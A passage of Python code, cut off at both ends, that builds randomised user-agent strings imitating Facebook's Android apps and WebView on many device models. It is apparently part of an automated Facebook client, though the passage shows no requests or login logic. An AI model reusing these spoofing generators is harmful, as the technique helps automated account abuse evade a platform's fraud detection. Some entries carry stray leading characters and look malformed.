Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/326.0.0.17.97;]','Mozilla/5.0 (Linux; Android 9; SM-J415GN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/335.0.0.15.96;]','Mozilla/5.0 (Linux; Android 9; SM-J415GN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/318.0.0.16.105;]','Mozilla/5.0 (Linux; Android 9; SM-J415GN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]','Mozilla/5.0 (Linux; Android 9; SM-J415GN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/224.0.0.33.114;]','Mozilla/5.0 (Linux; Android 9; SM-J415GN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/403.1.0.17.106;]','Mozilla/5.0 (Linux; Android 9; SM-J415GN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]','Mozilla/5.0 (Linux; Android 9; SM-J415GN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/343.0.0.13.79;]','Mozilla/5.0 (Linux; Android 9; SM-J415GN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]','Mozilla/5.0 (Linux; Android 9; SM-J415GN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/389.0.0.42.111;]','Mozilla/5.0 (Linux; Android 9; SM-J415GN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114;]','Mozilla/5.0 (Linux; Android 9; SM-J415G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/350.0.0.5.116;]','Mozilla/5.0 (Linux; Android 9; SM-J415F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/395.0.0.10.75;]'])
                        ua_strin = 'Dalvik/2.1.0 (Linux; U; Android 5.0.0; View Prime Build/v12bn [FBAN/FB4A;FBAV/353.0.0.27.492;FBBV/558626621;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/558626621;FBMF/Wiko;FBBD/Wiko;FBPN/com.facebook.orca;FBDV/View Prime;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        fbap = random.choice(['414.0.0.30.113','398.0.0.21.105','274.0.0.22.117','316.4.0.15.120','385.0.0.32.114','415.0.0.34.107','414.0.0.30.113','357.0.0.13.112','415.0.0.34.107','408.1.0.16.113','412.0.0.22.115','240.0.0.38.121','414.0.0.30.113'])
                        #EN = '[FBAN/FB4A;FBAV/'+vs1+'.0.0.'+vs2+'.'+vs3+';FBPN/com.facebook.katana;FBLC/en_US;FBBV/'+fbbv+';FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/'+models+';FBSV/samsung.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=350,height=846};]'
                        #ENB = '[FBAN/FB4A;FBAV/257.0.0.44.118;FBBV/197851411;FBDM/{density=3.0,width=1080,height=2118};FBLC/en_US;FBRV/199646485;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+models+';FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
                        #OCS = f'[FBAN/'+fban+';FBAV/'+vs1+'.0.0.'+vs2+'.'+vs3+';FBPN/'+fbks+';FBLC/'+ed+';FBBV/'+fbbv+';FBCR/'+tel+';FBMF/samsung;FBBD/samsung;FBDV/'+models+';FBSV/'+vs+';FBCA/armeabi-v7a:armeabi;FBDM/{density='+densi+',width='+wiidth+',height='+heiight+'};FB_FW/1;FBRV/'+fbrr+']'
                        ENB = random.choice(['[FBAN/FB4A;FBAV/'+vs1+'.0.0.'+vs2+'.'+vs3+';FBPN/com.facebook.katana;FBLC/en_US;FBBV/'+fbbv+';FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/'+models+';FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/'+fbrr+';]','[FBAN/FB4A;FBAV/'+vs1+'.0.0.'+vs2+'.'+vs3+';FBPN/com.facebook.katana;FBLC/en_US;FBBV/'+fbbv+';FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/'+models+';FBSV/samsung.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=350,height=846};]'])
                        #END = '[FBAN/FB4A;FBAV/353.0.0.27.492;FBBV/558626621;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/558626621;FBMF/Wiko;FBBD/Wiko;FBPN/com.facebook.orca;FBDV/View Prime;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        model4= random.choice(['1210','1250','1300','1310','1350','1410','1420','1450','1500','1510','1550','1610','1650','1710','1720','1750','1820','1910','1920','1950','2010','1930','1940','1960','2110','2150','V1020','V1120','V1220','V1320','V1420','V1520','V1620','V1720','V1820','V1920','V1910','V2010','V2020','V2120','V2110'])
                        UAD = '[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634218;FBDM/{density=3.0,width=1080,height=2139};FBLC/en_GB;FBRV/239534318;FBCR/AIRTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/vivo '+model4+';FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
                        #END = '[FBAN/FB4A;FBAV/'+facebook_version+';FBBV/'+fbbv+';FBDM/{density='+densi+',width='+wiidth+',height='+heiight+'};FBLC/en_US;FBRV/'+fbkk+';FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-'+model2+';FBSV/'+vs+';FBOP/1;FBCA/arm64-v8a:;]'
                        #UAD = random.choice(['[FBAN/FB4A;FBAV/243.0.0.47.108;FBBV/178056661;FBDM/{density=3.0,width=1080,height=2139};FBLC/en_GB;FBRV/179063150;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/'+fbkj+';FBDV/'+models+';FBSV/{random.randint(4,10)};FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/243.0.0.47.108;FBBV/178056661;FBDM/{density=3.0,width=1080,height=2139};FBLC/en_GB;FBRV/179063150;FBCR/AIRTEL;FBMF/samsung;FBBD/samsung;FBPN/'+fbkj+';FBDV/'+models+';FBSV/9;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/243.0.0.47.108;FBBV/178056661;FBDM/{density=3.0,width=1080,height=2139};FBLC/en_GB;FBRV/179063150;FBCR/AIRTEL;FBMF/samsung;FBBD/samsung;FBPN/'+fbkj+';FBDV/'+models+';FBSV/{random.randint(4,10)};FBOP/1;FBCA/arm64-v8a:;]'])
                        #ua = 'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-A850FU Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A850FU;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]'
                        #ua = random.choice(['Dalvik/2.1.0 (Linux; U; Android 7; SM-G1150F Build/QP1A.411900.502) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G1150F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android 9.0.1; Nokia Build/QP1A.792171.342) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Nokia;FBBD/Nokia;FBDV/Nokia;FBSV/Nokia.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=350,height=846};]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-A950G Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A950G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G900Y Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G900Y;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G1150F Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G1150F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G1800F Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G1800F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G533G Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G533G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android 9.0.1; Nokia Build/QP1A.792171.342) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Nokia;FBBD/Nokia;FBDV/Nokia;FBSV/Nokia.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=350,height=846};]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-A950G Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A950G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G900Y Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G900Y;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G1150F Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G1150F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G1800F Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G1800F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G533G Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G533G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G533G Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G533G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G1800F Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.lite;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G1800F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-A1100S Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A1100S;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-A850FU Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/en_US;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A850FU;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]'])
                        uas = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,10)}; vivo '+model4+' Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+UAD
                        #ua = random.choice(['[FBAN/FB4A;FBAV/208.0.0.38.104;FBBV/141745672;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBRV/142867518;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360F;FBSV/5.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/208.0.0.38.104;FBBV/141745700;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBRV/142442135;FBCR/Verizon Wireless;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1254;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/208.0.0.38.104;FBBV/141745740;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/142547474;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950W;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/209.0.0.39.91;FBBV/142863927;FBDM/{density=2.75,width=1080,height=2028};FBLC/en_GB;FBRV/0;FBCR/3;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 3;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]'])
                        #dv = 'Dalvik/2.1.0 (Linux; U; Android 13; SM-A300FU Build/TP1A.220624.014) [FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454103;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/iD;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'
                        dvl = random.choice(['Dalvik/2.1.0 (Linux; U; Android 9; Viva_1003G Build/PPR1.180610.011) ','Dalvik/2.1.0 (Linux; U; Android 12; ZTE A2322G Build/SKQ1.220213.001) ','Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G (2022) Build/S1SDS32.56-81-10) ','Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R112-15359.58.0) ','Dalvik/2.1.0 (Linux; U; Android 13; SM-A3460 Build/TP1A.220624.014) ','Dalvik/2.1.0 (Linux; U; Android 13; V2239 Build/TP1A.220624.014) ','Dalvik/2.1.0 (Linux; U; Android 11; S1 Build/RP1A.201005.001) ','Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230405.003) ','Dalvik/2.1.0 (Linux; U; Android 13; Bengal for arm64 Build/TKQ1.221013.002) ','Dalvik/2.1.0 (Linux; U; Android 7.0; X12 Build/NRD90M)','BDalvik/2.1.0 (Linux; U; Android 13; CPH2465 Build/RKQ1.211119.001) ','Dalvik/2.1.0 (Linux; U; Android 11; Q9.r1.00.6330_642.d4 Build/RP1A.201105.002) ','Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R112-15359.45.0)','WDalvik/2.1.0 (Linux; U; Android 13; Subsystem for Android(TM) Build/TQ2A.230305.008.C1 ','Dalvik/2.1.0 (Linux; U; Android 13; TECNO KI7 Build/TP1A.220624.014) ','Dalvik/2.1.0 (Linux; U; Android 8.1.0; N210 Build/OPM2.171019.012)','Dalvik/2.1.0 (Linux; U; Android 5.1; i1002SK Build/LMY47I)','GDalvik/2.1.0 (Linux; U; Android 11; Hisense E20s Build/RP1A.201005.001)','DDalvik/2.1.0 (Linux; U; Android 10; Primo E12 Build/QP1A.190711.020)','PDalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQ32.20-42-10-1)','Dalvik/1.6.0 (Linux; U; Android 4.2.2; SBM303SH Build/S0034)','Dalvik/2.1.0 (Linux; U; Android 12; V22S Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G955N Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','IDalvik/2.1.0 (Linux; U; Android 8.0.0; Moto Z (2) Build/OPXS27.109-40-22)','@Dalvik/2.1.0 (Linux; U; Android 11; AT70K Build/RP1A.201005.006)','CDalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-42-42)','BDalvik/2.1.0 (Linux; U; Android 11; RMX3506 Build/RP1A.201005.001)','DDalvik/2.1.0 (Linux; U; Android 13; 21051182C Build/TKQ1.221013.002)','Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC62 Build/61.2.A.0.410)','GDalvik/2.1.0 (Linux; U; Android 11; AQUOS-TVE21A Build/RTM2.210929.167)','ADalvik/2.1.0 (Linux; U; Android 8.0.0; MBX4K Ranger Build/NHG47L)','ZDalvik/2.1.0 (Linux; U; Android 13; SM-G770F Build/TP1A.220624.014; BroadcastDotRadioApp )','ADalvik/2.1.0 (Linux; U; Android 10; VOG-TL00 Build/HUAWEIDRA-LX9)','Dalvik/2.1.0 (Linux; U; Android 8.1.0; S23 Ultra Build/O11019)','JDalvik/2.1.0 (Linux; U; Android 9; UK 4K Android TV Build/PTO6.220926.001)','HDalvik/2.1.0 (Linux; U; Android 12; Armor X10 Pro Build/SP1A.210812.016)','ADalvik/2.1.0 (Linux; U; Android 10; LT600T Build/QKQ1.200216.002)','6Dalvik/2.1.0 (Linux; U; Android 13; SHG07 Build/S116H)','BDalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/T3B2.230316.003)','Dalvik/2.1.0 (Linux; U; Android 5.1; Ixion ES350 Build/DEXP)','ADalvik/2.1.0 (Linux; U; Android 12; ELZ-AN20 Build/HONORELZ-AN20)','ODalvik/2.1.0 (Linux; U; Android 13; motorola edge 20 pro Build/T1RA33.55-15-10)','@Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_Z012DA Build/MMB29P)','EDalvik/2.1.0 (Linux; U; Android 11; BQru-6868L Build/RP1A.201005.001)','IDalvik/2.1.0 (Linux; U; Android 12; TAB_912_PRO_4G Build/SP1A.210812.016)','EDalvik/2.1.0 (Linux; U; Android 11; 22031116AI Build/RP1A.200720.011)','DDalvik/2.1.0 (Linux; U; Android 10; O2 TV Box Build/QTT2.200720.001)','IDalvik/2.1.0 (Linux; U; Android 9; motorola one vision Build/PSA29.97-37)','Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PMAIN1.2992N)','CDalvik/2.1.0 (Linux; U; Android 13; M2101K6P Build/TKQ1.221013.002)','FDalvik/2.1.0 (Linux; U; Android 13; V2127 Build/TP1A.220624.014_NONFC)','BDalvik/2.1.0 (Linux; U; Android 11; octopus Build/R112-15359.58.0)','EDalvik/2.1.0 (Linux; U; Android 13; 23021RAAEG Build/TKQ1.221114.001)','FDalvik/2.1.0 (Linux; U; Android 13; SM-G950F Build/TQ2A.230405.003.E1)','DDalvik/2.1.0 (Linux; U; Android 12; 100071485 Build/SP1A.210812.016)','BDalvik/2.1.0 (Linux; U; Android 9; SM-A505N Build/PPR1.180610.011)','Dalvik/2.1.0 (Linux; U; Android 10.0; YT7260L Build/PPR1.180610.011)','Dalvik/2.1.0 (Linux; U; Android 8.1.0; Gtel X7plus Build/O11019)','Dalvik/1.6.0 (Linux; U; Android 4.4.4; TPS550A Build/KTU84Q)','Dalvik/2.1.0 (Linux; U; Android 10; TC57 Build/10-16-10.00-QG-U133-STD-HEL-04)','Dalvik/2.1.0 (Linux; U; Android 13; CPH2271 Build/TP1A.220905.001)','Dalvik/2.1.0 (Linux; U; Android 8.1.0; iris60c Build/O11019)','Dalvik/2.1.0 (Linux; U; Android 5.1.1; GT-S7580 Build/LMY48Y)','Dalvik/2.1.0 (Linux; U; Android 7.0; SPYBOXSXMINI Build/NRD90M)','Dalvik/2.1.0 (Linux; U; Android 11; K55g Build/RP1A.201005.001)','Dalvik/2.1.0 (Linux; U; Android 12; V2065 Build/SP1A.210812.003)','Dalvik/2.1.0 (Linux; U; Android 11; E506 Build/RP1A.201005.001)','Dalvik/2.1.0 (Linux; U; Android 11; BNE-LX3 Build/HUAWEIBNE-LX3)','Dalvik/2.1.0 (Linux; U; Android 9; APEXA-A-1500 Build/PI)','Dalvik/2.1.0 (Linux; U; Android 9; DL3Plus Build/PPR1.180610.011)','Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.501VZ.0568.a)','Dalvik/2.1.0 (Linux; U; Android 9; VISIO TV Build/PTO7.210711.001)','Dalvik/2.1.0 (Linux; U; Android 9.0; PHILCO_ATV11 Build/NHG47L)','Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 8 Build/TQ1A.230205.002)','Dalvik/2.1.0 (Linux; U; Android 12; RBN-NX1 Build/HONORRBN-N31)','MDalvik/2.1.0 (Linux; U; Android 10; motorola one action Build/QSB30.62-17-17)','Dalvik/2.1.0 (Linux; U; Android 5.1; YU 6000 Build/LMY47D)','EDalvik/2.1.0 (Linux; U; Android 13; 23028RA60L Build/TKQ1.221114.001)','Dalvik/2.1.0 (Linux; U; Android 10; Note 7T Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','CDalvik/2.1.0 (Linux; U; Android 13; SM-G9880 Build/TP1A.220624.014)','Dalvik/2.1.0 (Linux; U; Android 11; T10W2 Build/RP1A.201105.002)','CDalvik/2.1.0 (Linux; U; Android 13; SM-A346M Build/TP1A.220624.014)','CDalvik/2.1.0 (Linux; U; Android 11; CORN X55 Build/RP1A.201005.001)','Dalvik/2.1.0 (Linux; U; Android 5.1.1; PO-10034 Build/LMY47V)','DDalvik/2.1.0 (Linux; U; Android 11; 2209116AG Build/RKQ1.200826.002)','Dalvik/2.1.0 (Linux; U; Android 7.1.2; DroidBox Build/NHG47L)','HDalvik/2.1.0 (Linux; U; Android 9; moto e(6) plus Build/PTAS29.401-25-3)','ADalvik/2.1.0 (Linux; U; Android 11; Motorola Defy Build/RZD31.31)','BDalvik/2.1.0 (Linux; U; Android 10; HEYOU20 Build/QKQ1.191008.001)','>Dalvik/2.1.0 (Linux; U; Android 11; U55 Build/RP1A.200720.011)','FDalvik/2.1.0 (Linux; U; Android 8.1.0; px30_evb Build/OPM8.190505.001)','ODalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-3-1)','EDalvik/2.1.0 (Linux; U; Android 12; moto g72 Build/S3SVS32.45-28-2-2)','MDalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-1)','Dalvik/2.1.0 (Linux; U; Android 12; A003SH Build/S2010)','Dalvik/2.1.0 (Linux; U; Android 9; VOG-L04 Build/HUAWEIVOG-L04)','Dalvik/2.1.0 (Linux; U; Android 10; motorola one 5G ace Build/QZKS30.Q4-40-64-14)','Dalvik/2.1.0 (Linux; U; Android 11; JAD-LX9 Build/HUAWEIJAD-L09)','Dalvik/2.1.0 (Linux; U; Android 12; V2202 Build/SP1A.210812.003_SC)','Dalvik/2.1.0 (Linux; U; Android 10.1; T99 Build/QP1A.191105.004)'])
                        ck = random.choice(['[FBAN/FB4A;FBAV/377.1.0.36.103;FBBV/20454103;FBDM/{density=1.5,width=480,height=786};FBLC/de_DE;FBCR/o2 - de;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H340n;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/353.0.0.27.492;FBBV/20454103;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360T;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454103;FBDM/{density=1.5,width=540,height=888};FBLC/es_ES;FBCR/Claro;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D690;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/316.0.0.16.76;FBBV/20454103;FBDM/{density=1.5,width=540,height=888};FBLC/es_LA;FBCR/movistar;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoE2(4G-LTE);FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454103;FBDM/{density=1.5,width=540,height=960};FBLC/en_GB;FBCR/DTAC;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J200GU;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454103;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/iD;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=1196,height=720};FBLC/sv_SE;FBCR/Telia 